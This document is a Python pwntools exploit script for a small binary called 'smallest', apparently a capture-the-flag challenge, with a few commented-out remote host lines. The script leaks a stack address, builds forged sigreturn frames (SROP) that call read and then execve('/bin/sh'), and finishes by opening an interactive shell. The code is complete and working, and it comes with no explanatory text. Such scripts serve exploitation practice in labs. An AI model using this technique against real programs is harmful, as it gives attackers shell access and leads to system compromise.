from pwn import *
import time

context.log_level = 'debug'
context.arch = "amd64"
exe = './smallest'
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#s= remote('127.0.0.1',9992,timeout=60)
#s= remote('143.248.249.64',9010,timeout=60)
s = process(exe)
#def getpid():
#    time.sleep(0.1)
#    pid= pwnlib.util.proc.pidof(exe)
#    print pid

#raw_input('go!')
#getpid()

#gdb.attach(proc.pidof(s)[0],execute='b *0x4000be\n')

# write stack address  
main_addr = 0x4000b0
syscall_addr = 0x4000be

write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)
s.send(write_payload)

s.send("\xb3") # set rax=1  write 
stack_addr = u64(s.recv()[8:16])
print hex(stack_addr)

# frame 
# call read into stack_addr
# target : get "/bin/sh" addr
frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_read
frame.rdi = 0x0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr

read_frame_payload = p64(main_addr) + p64(0) + str(frame)
s.send(read_frame_payload)

goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8) # sigreturn syscall is 15 
s.send(goto_sigreturn_payload)

# frame 
# call execv("/bin/sh",0,0)
frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_execve
frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr 
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = stack_addr
frame.rip = syscall_addr

execv_frame_payload = p64(main_addr) + p64(0) + str(frame)
execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"
s.send(execv_frame_payload_all)

s.send(goto_sigreturn_payload)  

s.interactive()


